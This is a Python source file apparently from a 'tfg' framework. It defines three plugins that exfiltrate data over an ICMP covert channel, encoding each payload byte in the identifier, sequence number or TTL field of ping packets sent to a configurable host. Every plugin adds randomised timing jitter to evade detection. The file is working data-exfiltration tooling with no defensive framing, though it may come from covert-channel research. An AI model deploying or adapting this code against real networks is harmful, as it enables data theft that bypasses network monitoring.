
from __future__ import annotations
from typing import Dict, Any, Iterable, Optional
import time, random

from tfg.plugins.api import ExfilClientPlugin
from .icmp_common import build_header_bytes, iter_bytes_from_chunks, EOT

def _sleep_rhythm(base_ms: int, disp_ms: int) -> None:
    if base_ms or disp_ms:
        jitter = random.uniform(-disp_ms, disp_ms)
        t = max(0.0, (base_ms + jitter) / 1000.0)
        time.sleep(t)

def _send_symbol_identifier(dst: str, b: int, iface: Optional[str] = None, ttl_base: Optional[int] = None):
    from scapy.all import IP, ICMP, send, RandShort
    ip = IP(dst=dst)
    if ttl_base is not None:
        ip.ttl = (int(ttl_base) + (b & 0xFF)) & 0xFF or 1
    ic = ICMP(type=8)  # echo-request
    ic.id = (b & 0xFF) | ((RandShort() & 0xFF) << 8)
    ic.seq = RandShort()
    send(ip / ic, verbose=False, iface=iface)

def _send_symbol_sequence(dst: str, b: int, iface: Optional[str] = None, ttl_base: Optional[int] = None):
    from scapy.all import IP, ICMP, send, RandShort
    ip = IP(dst=dst)
    if ttl_base is not None:
        ip.ttl = (int(ttl_base) + (b & 0xFF)) & 0xFF or 1
    ic = ICMP(type=8)
    ic.id = RandShort()
    ic.seq = (b & 0xFF) | ((RandShort() & 0xFF) << 8)
    send(ip / ic, verbose=False, iface=iface)

def _send_symbol_ttl(dst: str, b: int, iface: Optional[str] = None, ttl_base: int = 64):
    from scapy.all import IP, ICMP, send, RandShort
    ip = IP(dst=dst, ttl=((int(ttl_base) + (b & 0xFF)) & 0xFF) or 1)
    ic = ICMP(type=8, id=RandShort(), seq=RandShort())
    send(ip / ic, verbose=False, iface=iface)

class IcmpClientIdentifier(ExfilClientPlugin):
    canal = "ICMP"
    metodo = 1  # Identifier
    name = "icmp_client_identifier"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config.get("host") or "127.0.0.1"
        exfil_id = config.get("exfil_id") or str(int(time.time()*1000))
        auth_token = config.get("auth_token")
        iface = config.get("iface")
        ttl_base = config.get("ttl_base")
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp  = int(config.get("ritmo_dispersion_ms") or 0)

        header = build_header_bytes(exfil_id, auth_token)
        sent = 0
        for b in header:
            _send_symbol_identifier(host, b, iface=iface, ttl_base=ttl_base); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        for b in iter_bytes_from_chunks(payload_iter):
            _send_symbol_identifier(host, b, iface=iface, ttl_base=ttl_base); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        _send_symbol_identifier(host, EOT, iface=iface, ttl_base=ttl_base); sent += 1
        return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_symbols": sent}

class IcmpClientSequence(ExfilClientPlugin):
    canal = "ICMP"
    metodo = 2  # Sequence Number
    name = "icmp_client_sequence"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config.get("host") or "127.0.0.1"
        exfil_id = config.get("exfil_id") or str(int(time.time()*1000))
        auth_token = config.get("auth_token")
        iface = config.get("iface")
        ttl_base = config.get("ttl_base")
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp  = int(config.get("ritmo_dispersion_ms") or 0)

        header = build_header_bytes(exfil_id, auth_token)
        sent = 0
        for b in header:
            _send_symbol_sequence(host, b, iface=iface, ttl_base=ttl_base); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        for b in iter_bytes_from_chunks(payload_iter):
            _send_symbol_sequence(host, b, iface=iface, ttl_base=ttl_base); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        _send_symbol_sequence(host, EOT, iface=iface, ttl_base=ttl_base); sent += 1
        return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_symbols": sent}

class IcmpClientTTL(ExfilClientPlugin):
    canal = "ICMP"
    metodo = 3  # TTL
    name = "icmp_client_ttl"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config.get("host") or "127.0.0.1"
        exfil_id = config.get("exfil_id") or str(int(time.time()*1000))
        auth_token = config.get("auth_token")
        iface = config.get("iface")
        ttl_base = int(config.get("ttl_base") or 64)
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp  = int(config.get("ritmo_dispersion_ms") or 0)

        header = build_header_bytes(exfil_id, auth_token)
        sent = 0
        for b in header:
            _send_symbol_ttl(host, b, iface=iface, ttl_base=ttl_base); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        for b in iter_bytes_from_chunks(payload_iter):
            _send_symbol_ttl(host, b, iface=iface, ttl_base=ttl_base); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
        _send_symbol_ttl(host, EOT, iface=iface, ttl_base=ttl_base); sent += 1
        return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_symbols": sent}
